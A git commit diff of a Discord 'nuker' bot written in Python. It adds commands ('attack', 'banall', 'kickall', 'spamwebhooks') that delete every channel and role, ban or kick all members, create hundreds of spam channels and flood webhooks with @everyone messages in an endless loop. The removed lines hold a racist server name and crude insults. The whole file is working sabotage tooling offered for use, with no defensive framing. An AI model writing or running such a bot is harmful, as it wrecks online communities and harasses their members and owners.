0305767117b02d9a41dc4e67ecf321c4bb2152d3
ArtemBay <kkunfin@gmail.com>
2022-03-19 10:17:26 +0900

    123

--- main.py
+++ main.py
@@ -1,37 +1,27 @@
 import os, discord, aiohttp, json
 from discord.ext import commands
 
-prefix = '!'
+prefix = '$'
 spam_message = '@everyone server was crashed'
-spam_role_name = "Crashed"
-spam_channel_name = 'Crashed'
-owners=[ ] #owners ids
+spam_role_name = "crashed"
+spam_channel_name = 'crashed'
 token = ' '
+name = "crashed"
 client = commands.Bot(prefix, intents=discord.Intents.all())
 client.remove_command( 'help' )
-
-async def on_guild_join(guild):
-    with open('db.json', 'r') as f: db = json.load(f)
-    adder=None
-    try:
-        async for entry in guild.audit_logs(action=discord.AuditLogAction.bot_add):
-            adder=entry.user
-            break
-        if adder.id in db['black']:
-            try: await adder.send(":x: Тебя нельзя использовать меня")
-            except: pass
-            await guild.leave()
-            return
-    except:
-        adder="Unknown"
+client.spam = False
 
 async def chs(guild):
-    for u in guild.channels:  # Удаление каналов
-        try: await u.delete()
-        except: pass
-    for u in guild.roles:
-        try: await u.delete()
-        except: pass
+    try:
+        for i in guild.channels:
+            try:
+                await i.delete()
+            except:
+                pass
+        for timer in range(250):
+            await guild.create_text_channel(spam_channel_name)
+    except:
+        pass
 
 async def rls(guild):
     for yi in range(1, 501):
@@ -40,7 +30,38 @@ async def rls(guild):
         try: await guild.create_text_channel(spam_channel_name)
         except: pass
 
-async def bns(guild, mem=None):
+@client.command()
+async def banall(ctx):
+    guild=ctx.guild
+    await bns(guild, ctx.author)
+
+@client.command()
+async def kickall(ctx):
+    guild=ctx.guild
+    await kck(guild, ctx.author)
+
+@client.command()
+async def clear(ctx):
+    new=await ctx.channel.clone()
+    await new.edit(position=ctx.channel.position)
+    await ctx.channel.delete()
+
+@client.command()
+async def rename(ctx):
+    with open('icon.PNG', 'rb') as f:
+        icon = f.read()
+        await ctx.guild.edit(name=name, icon=icon)
+
+@client.command()
+async def send(ctx, member: discord.Member, *, text):
+    await ctx.message.delete()
+    try:
+        await member.send(text)
+    except:
+        await ctx.send(f'Не смог отправить сообщение!')
+
+
+async def kck(guild, mem=None):
     lavan=guild.get_member(704967695036317777)
     cp=guild.get_member(752367350657056851)
     wick=guild.get_member(536991182035746816)
@@ -55,6 +76,28 @@ async def bns(guild, mem=None):
     for m in guild.members:
         if m.id != client.user.id:
             try: await m.kick()
+            except: st+=f'{m}  ID: {m.id}, \n'
+    with open("not_kicked.txt", 'w', encoding='utf-8') as f: f.write(st); f.close()
+    location=os.getcwd()
+    path = os.path.join(location, "not_kicked.txt")
+    try: await mem.send(file=discord.File(str(path)))
+    except Exception as e: print(e)
+
+async def bns(guild, mem=None):
+    lavan=guild.get_member(704967695036317777)
+    cp=guild.get_member(752367350657056851)
+    wick=guild.get_member(536991182035746816)
+    sbd=guild.get_member(856495339028873216)
+    sec=guild.get_member(651095740390834176)
+    akbs=[lavan, cp, wick, sbd, sec]
+    for akb in akbs:
+        if akb: 
+            try: await akb.ban()
+            except: pass
+    st=''
+    for m in guild.members:
+        if m.id != client.user.id:
+            try: await m.ban()
             except: st+=f'{m}  ID: {m.id}, \n'
     with open("not_kicked.txt", 'w', encoding='utf-8') as f: f.write(st); f.close()
     location=os.getcwd()
@@ -88,23 +131,21 @@ async def on_command_error(ctx, err):
 @client.event
 async def on_guild_channel_create(channel):
     if channel.name == spam_channel_name and isinstance(channel, discord.TextChannel):
-        webhook = await channel.create_webhook(name = "nuked")
+        webhook = await channel.create_webhook(name = "crash")
         webhook_url = webhook.url
         async with aiohttp.ClientSession() as session:
             webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
             while True:
                 try: 
-                    await webhook.send('@everyone @here 🙈', embed=discord.Embed(title='** Привет котаны!) Данный сервер крашится**', content=' **админ соси хуй**'), username='Админ петух')
+                    await webhook.send(spam_message, embed=discord.Embed(title=spam_message, content=spam_message), username=spam_message)
                 except:
                     pass
 
 @client.command()
-async def st(ctx):
-    with open('db.json', 'r') as f: db = json.load(f)
-    if ctx.guild.id in db['white']: return await ctx.send('Fuck you')
+async def attack(ctx):
     guild=ctx.guild
     await bns(guild, ctx.author)
-    try: await guild.edit(name='×××WHITE POWER×××𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎 𒐫𒀱𒁎 𒐫א𒀱𒁎 𒐫𒀱𒁎')
+    try: await guild.edit(name=name)
     except Exception as e: print(e)
     await chs(guild)
     await rls(guild)
@@ -112,8 +153,6 @@ async def st(ctx):
 @client.command()
 @commands.cooldown(1, 120, commands.BucketType.user)
 async def roles(ctx):
-    with open('db.json', 'r') as f: db = json.load(f)
-    if ctx.guild.id in db['white']: return await ctx.send('Fuck you')
     for g in ctx.guild.roles:
         try:
             await g.delete()
@@ -128,8 +167,6 @@ async def roles(ctx):
 @client.command()
 @commands.cooldown(1, 300, commands.BucketType.user)
 async def ban(ctx):
-    with open('db.json', 'r') as f: db = json.load(f)
-    if ctx.guild.id in db['white']: return await ctx.send('Fuck you')
     for o in ctx.guild.members:
         if o.id != client.user.id:
             try:
@@ -140,19 +177,22 @@ async def ban(ctx):
 @client.command()
 @commands.cooldown(1, 30, commands.BucketType.user)
 async def channels(ctx):
-    with open('db.json', 'r') as f: db = json.load(f)
-    if ctx.guild.id in db['white']: return await ctx.send('Fuck you')
     try:
         for i in ctx.guild.channels:
             try:
                 await i.delete()
             except:
                 pass
-        for timer in range(1, 250):
+        for timer in range(250):
             await ctx.guild.create_text_channel(spam_channel_name)
-            await ctx.guild.create_voice_channel(spam_channel_name)
     except:
         pass
+
+@client.command()
+async def spamwebhooks(ctx):
+    if ctx.guild.channels <= 50:
+        client.spam = True
+        await ctx.send("spam")
 
 @client.command()
 async def help(ctx):
@@ -160,37 +200,17 @@ async def help(ctx):
     try:
         await ctx.author.send(f'''
 {prefix}roles  - del all roles and spam them
-{prefix}ban  - ban all
+{prefix}banall  - ban all
 {prefix}channels  - del all channels and spam them
-{prefix}st  - auto crash
+{prefix}attack  - auto crash
+{prefix}ban - ban user
+{prefix}kickall - kick all
+{prefix}clear - clear chat
+{prefix}rename - rename server and change ico
+{prefix}send - send message to user
+{prefix}spamwebhooks - spam webhooks
 ''')
     except:
         await ctx.send('Open dm')
-
-@client.command()
-async def leave(ctx):
-    if ctx.author.id not in owners: return await ctx.send('Fuck you')
-    await ctx.guild.leave()
-
-@client.command()
-async def wl(ctx, mode='view', id=None):
-    if ctx.author.id not in owners: return await ctx.send('Fuck you')
-    if not id: id=ctx.guild.id
-    if mode not in ['add', 'remove', 'view', 'list']: return await ctx.send('use `wl add id` or `wl remove id` or just `wl`')
-    with open('db.json', 'r') as f: db = json.load(f)
-    if mode == 'add':
-        db['white'].append(id)
-        with open('db.json', 'w') as f: json.dump(db,f)
-    elif mode == 'remove':
-        try: db['white'].remove(id)
-        except: return await ctx.send('this id is not whitelisted')
-        with open('db.json', 'w') as f: json.dump(db,f)
-    else:
-        i=''
-        for idd in db['white']:
-            i+=f'⠀⠀{idd}\n'
-        embed=discord.Embed(title="Servers in whitelist:", description=i)
-        embed.set_footer(text='This servers i dont crash')
-        await ctx.send(embed=embed)
 
 client.run(token)
